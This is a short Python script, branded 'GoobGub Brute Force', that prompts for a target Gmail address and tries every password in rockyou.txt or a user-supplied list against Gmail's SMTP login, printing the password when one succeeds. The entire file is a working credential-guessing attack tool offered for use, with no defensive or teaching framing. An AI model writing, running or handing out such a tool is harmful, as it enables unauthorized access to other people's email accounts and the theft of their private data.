import smtplib
import sys
from os import system
from termcolor import colored

def artwork():
    print("\n")
    print(colored('''                                           
        ▄▄█▀▀▀█▄█                   ▄██         ▄▄█▀▀▀█▄█            ▄██
      ▄██▀     ▀█                    ██       ▄██▀     ▀█             ██
     ██▀       ▀  ▄██▀██▄  ▄██▀██▄  ██▄████▄ ██▀       ▀▀███  ▀███   ██▄████▄
     ██          ██▀   ▀████▀   ▀██ ██    ▀████           ██    ██   ██    ▀██
     ██▄    ▀██████     ████     ██ ██     ████▄    ▀████ ██    ██   ██     ██
      ▀██▄     ██ ██▄   ▄████▄   ▄██ ██▄   ▄██▀██▄     ██  ██    ██   ██▄   ▄██
        ▀▀███████  ▀█████▀  ▀█████▀  █▀█████▀   ▀▀███████  ▀████▀███▄ █▀█████▀
    
                                GoobGub Brute Force
    ''', "green"))

artwork()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail Adress => ")

print("\n")

pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to Add a custom password list\n => ")

if pwd=='0':
    passswfile="rockyou.txt"

elif pwd=='2':
    print("\n")
    passswfile = input("Name The File Path (For Password List) => ")

else:
    print("\n")
    print("Invalid input!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print(colored("[+] Password Found %s" % password, "green"))
        break

    except smtplib.SMTPAuthenticationError:
        print(colored("[!] Wrong. %s " % password, "red"))